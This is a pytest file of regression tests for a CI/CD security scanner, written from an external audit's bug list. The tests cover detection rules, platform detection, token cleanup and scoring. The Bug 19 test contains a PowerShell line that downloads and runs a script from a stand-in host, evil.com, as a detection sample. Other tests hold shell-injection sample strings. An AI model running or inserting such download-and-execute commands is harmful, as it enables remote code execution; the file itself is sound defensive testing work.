"""Regression cases derived from the external audit (2026-04).

Every test below encodes a SEPARATE confirmed bug. They are intentionally
written to FAIL on the current main — fixing each one should flip a single
test to green, so the ratio of green to red tracks fix progress.

Bug-ID numbering matches the audit log. Each test names the file:line
where the defect lives so reviewers don't have to re-derive it.
"""

from __future__ import annotations

import inspect
import re

import pytest


# =============================================================================
# Bug 1 — _SET_OUTPUT_RE group-name mismatch
# Location: taintly/taint.py:828-831  and  taintly/taint.py:1028
# =============================================================================

def test_bug01_set_output_re_has_group_name_not_n():
    """The regex declares (?P<n>...) but the consumer calls m.group("name").

    Latent because the modern $GITHUB_OUTPUT regex fires first on the same
    line. Any ::set-output emission that the modern regex misses would
    crash the analyzer and produce ENGINE-ERR findings.
    """
    from taintly.taint import _SET_OUTPUT_RE

    m = _SET_OUTPUT_RE.search('::set-output name=ref::somevalue"')
    assert m is not None, "regex must still match the legacy form"
    # The consumer in _detect_step_output_writes asks for group("name");
    # the fix is to rename (?P<n>...) to (?P<name>...).
    assert "name" in m.groupdict(), (
        "expected named group 'name' — currently declared as 'n', "
        "which raises IndexError at taint.py:1028"
    )


# =============================================================================
# Bug 2 — Jenkins dropped in scan_repo auto-detection fallthrough
# Location: taintly/engine.py:210-220
# =============================================================================

def test_bug02_scan_repo_fallthrough_includes_jenkins():
    """When detect_platform returns None, the fallthrough probes
    [GITHUB, GITLAB] but not JENKINS. A repo mid-migration (e.g., has
    both .github/workflows/ and a Jenkinsfile) silently gets zero
    Jenkins coverage.
    """
    from taintly import engine

    src = inspect.getsource(engine.scan_repo)
    # Find the fallthrough loop.
    fallthrough = re.search(
        r"for p in \[([^\]]+)\]:\s*\n\s*if discover_files",
        src,
    )
    assert fallthrough is not None, "fallthrough loop shape has changed"
    platforms = fallthrough.group(1)
    assert "Platform.JENKINS" in platforms, (
        "scan_repo fallthrough must include Jenkins; "
        "otherwise dual-platform repos silently skip Jenkinsfiles"
    )


# =============================================================================
# Bug 3 — SEC4-JK-001 fires on safe single-quoted sh strings
# Location: taintly/rules/jenkins/sec_jenkins.py:410 (and :481 for -002)
# =============================================================================

def test_bug03_sec4_jk_001_does_not_fire_on_single_quoted():
    """Single-quoted Groovy strings are NOT GStrings — Groovy does not
    interpolate ${params.X} inside them. No command injection is
    possible. The rule's own test_positive list (line 441) asserts this
    false positive as a true positive.
    """
    from taintly.rules.registry import load_all_rules

    rule = next(r for r in load_all_rules() if r.id == "SEC4-JK-001")

    safe = "sh 'docker build -t ${params.IMAGE_TAG} .'"
    matches = rule.pattern.check(safe, [safe])
    assert matches == [], (
        "single-quoted Groovy string is not an injection vector — "
        "Groovy leaves ${params.X} literal, shell doesn't expand it; "
        "rule pattern must use a backreference or separate regex per quote style"
    )

    dangerous = 'sh "docker build -t ${params.IMAGE_TAG} ."'
    assert rule.pattern.check(dangerous, [dangerous]), (
        "double-quoted form is the real injection — must still fire"
    )


# =============================================================================
# Bug 4 — GitLab job splitter leaks hidden templates and spec: as jobs
# Location: taintly/models.py:241-264  (_split_into_job_segments)
# =============================================================================

def test_bug04_gitlab_splitter_skips_hidden_and_spec():
    """Hidden-job templates (`.build:`) are YAML anchors, not jobs.
    `spec:` is the pipeline-inputs block (GitLab 15.7+). Both must NOT
    produce their own job segments, or every ContextPattern(scope=job)
    rule fires twice on every templated repo (i.e., every real repo).
    """
    from taintly.models import _split_into_job_segments

    content = (
        ".hidden_template:\n"
        "  script:\n"
        "    - echo hidden\n"
        "\n"
        "spec:\n"
        "  inputs:\n"
        "    foo:\n"
        "\n"
        "real_job:\n"
        "  script:\n"
        "    - echo real\n"
    )
    segments = _split_into_job_segments(content.splitlines())

    headlines = []
    for _start, seg in segments:
        for line in seg:
            s = line.strip()
            if s and not s.startswith("#"):
                headlines.append(s)
                break

    assert not any(h.startswith(".") for h in headlines), (
        f"hidden template leaked into segment list: {headlines}"
    )
    assert not any(h.startswith("spec:") for h in headlines), (
        f"spec: block leaked into segment list: {headlines}"
    )


# =============================================================================
# Bug 7 — Scorer "all pinned" bonus misses Jenkins rules
# Location: taintly/scorer.py:106
# =============================================================================

def test_bug07_pinning_bonus_includes_jenkins_rules():
    """A Jenkinsfile with unpinned shared libraries produces SEC3-JK-001
    AND gets the +5 "all pinned" bonus — the repo is rewarded for the
    exact violation that just fired.
    """
    from taintly.scorer import _PINNED_RULE_IDS

    assert "SEC3-JK-001" in _PINNED_RULE_IDS, (
        "Jenkins shared-library pinning rule must invalidate "
        "the all-pinned bonus; otherwise the scorer contradicts itself"
    )


# =============================================================================
# Bug 10 — TokenManager._sweep_tokens mutates list during iteration
# Location: taintly/platform/token.py:108-116
# =============================================================================

def test_bug10_sweep_tokens_clears_all_registered():
    """Iterating TokenManager._active while each .clear() calls
    _active.remove(self) skips every other element. In a dual-platform
    scan (both GH and GL tokens live), half the tokens are not wiped
    at exit.
    """
    from taintly.platform import token as token_mod

    # Register 5 live tokens.
    original_active = list(token_mod.TokenManager._active)
    try:
        token_mod.TokenManager._active.clear()
        tms = [token_mod.TokenManager(f"tok-{i:04d}", "env") for i in range(5)]

        # Call the exact function atexit would call.
        token_mod._sweep_tokens()

        # Every token must have been cleared.
        uncleared = [t for t in tms if t._value is not None]
        assert uncleared == [], (
            f"_sweep_tokens left {len(uncleared)}/5 tokens uncleared — "
            f"iterate a copy: `for tm in list(TokenManager._active):`"
        )
    finally:
        token_mod.TokenManager._active[:] = original_active


# =============================================================================
# Bug 18 — workflow_context signals are GitHub-Actions-only
# Location: taintly/workflow_context.py:68-91
# =============================================================================

def test_bug18_workflow_context_detects_jenkins_privilege():
    """A Jenkinsfile with `credentials('aws-prod')` + parameters used in
    sh is textbook SEC4-JK-001 / SEC6-JK-001 shape. workflow_context
    should recognise it as privileged; currently it returns
    is_privileged=False because every regex is GitHub-Actions-syntax-only.

    Consequence: every Jenkins (and GitLab) finding is scored at 0.5×
    weight — the entire Phase 2 exploitability work only applies to
    GitHub.
    """
    from taintly.workflow_context import analyze

    jenkinsfile = (
        "pipeline {\n"
        "  agent any\n"
        "  parameters { string(name: 'BRANCH', defaultValue: 'main') }\n"
        "  environment { AWS_CREDS = credentials('aws-prod') }\n"
        "  stages {\n"
        "    stage('Deploy') {\n"
        "      steps { sh \"deploy ${params.BRANCH}\" }\n"
        "    }\n"
        "  }\n"
        "}\n"
    )
    ctx = analyze(jenkinsfile, file="Jenkinsfile")
    assert ctx.is_privileged, (
        "Jenkins pipeline with credentials() + parameters in sh "
        "must register as privileged; current regex set only matches "
        "GitHub Actions syntax (pull_request_target, secrets., "
        "actions/checkout, etc.), leaving all Jenkins and GitLab "
        "findings systematically mis-weighted by the scorer"
    )


# =============================================================================
# Bug 19 — SEC6-GH-007 iex( overmatches benign PowerShell
# Location: taintly/rules/github/sec1_sec5_sec6_sec7_sec9.py:304
# =============================================================================

def test_bug19_sec6_gh_007_does_not_overmatch_iex():
    """Rule title: 'curl/wget output piped directly to shell'.
    The regex alternative `(iex\\s*\\()` fires on any PowerShell
    Invoke-Expression — including local dynamic-dispatch patterns
    with no remote fetch. Fix: require the iex body to reference
    Invoke-WebRequest / DownloadString / WebClient.
    """
    from taintly.rules.registry import load_all_rules

    rule = next(r for r in load_all_rules() if r.id == "SEC6-GH-007")

    benign = "        run: pwsh -c 'iex (Get-Content ./local-script.ps1)'"
    matches = rule.pattern.check(benign, [benign])
    assert matches == [], (
        "iex() on a local file is not curl-pipe-bash; must not fire"
    )

    # Sanity: the actual remote-fetch case must still match.
    dangerous = (
        "        run: pwsh -c 'iex (New-Object Net.WebClient)."
        "DownloadString(\"https://evil.com/p.ps1\")'"
    )
    assert rule.pattern.check(dangerous, [dangerous]), (
        "remote-download-then-invoke must still trigger"
    )


# =============================================================================
# Bug 23 — SEC4-GL-001 fires on single-quoted CI variables
# Location: taintly/rules/gitlab/sec1_sec4_sec6_sec7_sec9.py:83-92
# =============================================================================

def test_bug23_sec4_gl_001_single_quoted_not_injected():
    """Single-quoted shell strings do not expand `$VAR` — the dollar
    sign is literal. There is no command injection. The exclude list
    covers double-quoted usage but not single-quoted.
    """
    from taintly.rules.registry import load_all_rules

    rule = next(r for r in load_all_rules() if r.id == "SEC4-GL-001")

    safe = "    - echo '$CI_COMMIT_MESSAGE'"
    matches = rule.pattern.check(safe, [safe])
    assert matches == [], (
        "single-quoted CI variable in a shell script is not expanded "
        "by the shell — no injection is possible; exclude list must "
        "mirror the double-quote exclude for the single-quote case"
    )

    # Sanity: unquoted usage must still fire.
    dangerous = "    - echo $CI_COMMIT_MESSAGE"
    assert rule.pattern.check(dangerous, [dangerous]), (
        "unquoted usage is the real injection — must still fire"
    )


# =============================================================================
# Bug 24 — Benchmark taxonomy missing TAINT / LOTP rules
# Location: benchmark/taxonomy.py
# =============================================================================

def test_bug24_taxonomy_covers_taint_and_lotp_rules():
    """22 of 115 rules are unmapped in the benchmark taxonomy, heavily
    weighted toward the most sophisticated detection (every TAINT rule,
    every LOTP rule, and SEC4-GH-014/015/016). When taintly's results
    are compared against other scanners in Table V, the deepest
    engineering work is invisible in the comparison.
    """
    from taintly.rules.registry import load_all_rules
    from benchmark.taxonomy import TAXONOMY

    all_ids = {r.id for r in load_all_rules()}
    mapped = set()
    for t in TAXONOMY:
        mapped.update(t.taintly_rules)

    unmapped = sorted(all_ids - mapped)
    taint = [r for r in unmapped if r.startswith("TAINT-")]
    lotp = [r for r in unmapped if r.startswith("LOTP-")]

    assert not taint, (
        f"TAINT rules unmapped in taxonomy (action-injection work is "
        f"invisible in scanner comparison): {taint}"
    )
    assert not lotp, (
        f"LOTP rules unmapped in taxonomy: {lotp}"
    )


# =============================================================================
# Bug 21 — mutate_quote_swap produces semantics-destroying mutants
# Location: taintly/testing/mutations.py:34-39
# =============================================================================

def test_bug21_quote_swap_preserves_yaml_validity():
    """The current implementation blindly runs sample.replace("'", '"')
    and vice versa, which turns valid YAML like `run: echo "it's fine"`
    into invalid `run: echo "it"s fine"`. When the rule correctly skips
    the mangled input, the harness scores it as a FAILURE — inflating
    the survivor count and masking genuine FPs.
    """
    from taintly.testing.mutations import mutate_quote_swap

    # A common sample shape: double-quoted string containing an apostrophe.
    sample = 'run: echo "it\'s fine"'
    mutants = mutate_quote_swap(sample)
    for m in mutants:
        # Simple heuristic: balanced quote counts after the swap.
        # Asymmetric-quote mutants are the broken case.
        assert m.count('"') % 2 == 0, (
            f"quote_swap produced invalid mutant with odd \" count: {m!r}"
        )
        assert m.count("'") % 2 == 0, (
            f"quote_swap produced invalid mutant with odd ' count: {m!r}"
        )


# =============================================================================
# Run standalone for a quick failure-count snapshot:
#     python -m pytest tests/unit/test_audit_findings.py -v
# =============================================================================
